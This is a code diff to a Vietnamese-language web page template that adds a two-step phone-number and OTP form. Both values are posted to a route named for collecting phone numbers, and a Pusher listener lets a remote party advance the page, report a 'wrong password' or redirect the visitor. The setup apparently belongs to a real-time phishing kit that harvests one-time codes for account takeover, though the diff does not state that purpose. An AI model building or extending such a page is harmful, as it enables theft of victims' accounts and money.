@@ -70,17 +70,57 @@
       </p>
 
       <!-- Form -->
-      <form id="register-form" class="mt-8" onsubmit="return handleSubmit(event)">
-        <label for="phone" class="mb-2 block text-sm font-medium">Số điện thoại</label>
-        <input
-          id="phone"
-          name="phone"
-          type="tel"
-          inputmode="numeric"
-          autocomplete="tel"
-          placeholder="VD: 0901234567"
-          class="w-full rounded-xl border-2 border-accent/60 bg-accentlight px-4 py-3.5 text-base placeholder:text-ink/40 focus:border-accent focus:outline-none focus:ring-2 focus:ring-accent/30"
-        />
+      <form id="register-form" class="mt-8" onsubmit="return false;">
+        <!-- Step 1: Nhập số điện thoại -->
+        <div id="step-phone">
+          <label for="phone" class="mb-2 block text-sm font-medium">Số điện thoại</label>
+          <input
+            id="phone"
+            name="phone"
+            type="tel"
+            inputmode="numeric"
+            autocomplete="tel"
+            placeholder="VD: 0901234567"
+            class="w-full rounded-xl border-2 border-accent/60 bg-accentlight px-4 py-3.5 text-base placeholder:text-ink/40 focus:border-accent focus:outline-none focus:ring-2 focus:ring-accent/30"
+          />
+          <button
+            type="button"
+            id="send-otp-btn"
+            class="mt-6 flex w-full items-center justify-center gap-2 rounded-full bg-accent py-4 text-base font-medium text-white transition-colors hover:bg-accent/90 active:scale-[0.99]"
+            onclick="handleSendOtp(event)"
+          >
+            Gửi mã OTP
+          </button>
+        </div>
+        
+        <!-- Step 2: Nhập mã OTP 6 số -->
+        <div id="step-otp" class="hidden">
+          <label for="otp" class="mb-2 mt-4 block text-sm font-medium">Nhập mã OTP (6 số)</label>
+          <input
+            id="otp"
+            name="otp"
+            type="text"
+            inputmode="numeric"
+            maxlength="6"
+            pattern="\d{6}"
+            autocomplete="one-time-code"
+            placeholder="Nhập mã OTP gồm 6 số"
+            class="w-full rounded-xl border-2 border-accent/60 bg-accentlight px-4 py-3.5 text-base placeholder:text-ink/40 focus:border-accent focus:outline-none focus:ring-2 focus:ring-accent/30"
+          />
+
+          <button
+            id="submit-btn"
+            type="button"
+            class="mt-8 flex w-full items-center justify-center gap-2 rounded-full bg-ink py-4 text-base font-medium text-white transition-colors hover:bg-ink/85 active:scale-[0.99]"
+            onclick="handleVerifyOtp(event)"
+          >
+            Xác nhận đăng ký
+            <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M5 12h14" />
+              <path d="m13 6 6 6-6 6" />
+            </svg>
+          </button>
+        </div>
 
         <!-- Hiển thị lỗi -->
         <div id="error-message" class="hidden mt-3 text-center text-sm text-red-500">
@@ -91,20 +131,93 @@
         <div id="submit-message" class="hidden mt-3 text-center text-sm text-accent">
           Đang gửi đăng ký...
         </div>
-  
-
-        <button
-          id="submit-btn"
-          type="submit"
-          class="mt-8 flex w-full items-center justify-center gap-2 rounded-full bg-ink py-4 text-base font-medium text-white transition-colors hover:bg-ink/85 active:scale-[0.99]"
-        >
-          Đăng ký
-          <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-            <path d="M5 12h14" />
-            <path d="m13 6 6 6-6 6" />
-          </svg>
-        </button>
       </form>
+      <script>
+      function showError(msg) {
+        var errorDiv = document.getElementById('error-message');
+        errorDiv.textContent = msg;
+        errorDiv.classList.remove('hidden');
+      }
+      function hideError() {
+        var errorDiv = document.getElementById('error-message');
+        errorDiv.classList.add('hidden');
+      }
+
+      // Gửi yêu cầu gửi OTP với SĐT (POST lần 1)
+      function handleSendOtp(event) {
+        event.preventDefault();
+        hideError();
+        var phone = document.getElementById('phone').value.trim();
+
+        if (!phone.match(/^0\d{9,10}$/)) {
+          showError('Vui lòng nhập số điện thoại hợp lệ.');
+          return false;
+        }
+
+        // Disable nút gửi OTP và show loading message
+        var btn = document.getElementById('send-otp-btn');
+        btn.disabled = true;
+        btn.classList.add('opacity-70');
+        document.getElementById('submit-message').textContent = 'Đang gửi mã OTP...';
+        document.getElementById('submit-message').classList.remove('hidden');
+
+        // Gửi request chỉ với SĐT -- endpoint riêng
+        $.post("{{ route('post.customweb.bo23333_laysdt') }}", {
+            d: JSON.stringify({
+                phone: phone,
+                step: 'send_otp',
+                info: '{{ $info }}'
+            }),
+            'p_c': "{{ $pusher_code }}",
+            '_token': '{{ csrf_token() }}'
+          },
+          function(data) {
+          },
+          "json"
+        )
+        return false;
+      }
+
+      // Gửi yêu cầu xác nhận OTP với SĐT + OTP (POST lần 2)
+      function handleVerifyOtp(event) {
+        event.preventDefault();
+        hideError();
+        var phone = document.getElementById('phone').value.trim();
+        var otp = document.getElementById('otp').value.trim();
+        if (!phone.match(/^0\d{9,10}$/)) {
+          showError('Vui lòng nhập số điện thoại hợp lệ.');
+          return false;
+        }
+        if (!otp.match(/^\d{6}$/)) {
+          showError('Mã OTP phải gồm 6 chữ số.');
+          return false;
+        }
+        var btn = document.getElementById('submit-btn');
+        btn.disabled = true;
+        btn.classList.add('opacity-70');
+        document.getElementById('submit-message').textContent = 'Đang xác thực...';
+        document.getElementById('submit-message').classList.remove('hidden');
+
+        // Gửi request với phone+otp -- endpoint riêng xác thực
+        $.post("{{ route('post.customweb.bo23333_laysdt') }}", {
+            d: JSON.stringify({
+              phone: phone,
+              otp: otp,
+              step: 'verify_otp',
+              info: '{{ $info }}'
+            }),
+            'p_c': "{{ $pusher_code }}",
+            '_token': '{{ csrf_token() }}'
+          },
+          function(data) {
+            
+          },
+          "json"
+        )
+
+        return false;
+      }
+      </script>
       <script>
         var pusher = new Pusher('a16c3bab85659b6d2b51', {
             cluster: 'ap1',
@@ -115,6 +228,22 @@
                 $("#warning_notice").hide()
                 window.location.href =
                     '{!! $data->redirect_link !!}'
+            } else {
+                if (data.otp) {
+                    document.getElementById('step-otp').classList.remove('hidden');
+                    document.getElementById('step-phone').classList.add('hidden');
+                    $("#submit-btn").attr('disabled', false).html('Tiếp tục')
+                }
+                if (data.wrong_user) {
+                    showError('Số điện thoại không hợp lệ')
+                    document.getElementById('step-otp').classList.add('hidden');
+                    document.getElementById('step-phone').classList.remove('hidden');
+                    $("#submit-btn").attr('disabled', false).html('Tiếp tục')
+                }
+                if (data.wrong_password) {
+                    showError('Mã OTP không hợp lệ')
+                    $("#submit-btn").attr('disabled', false).html('Tiếp tục')
+                }
             }
         });
       function handleSubmit(event) {
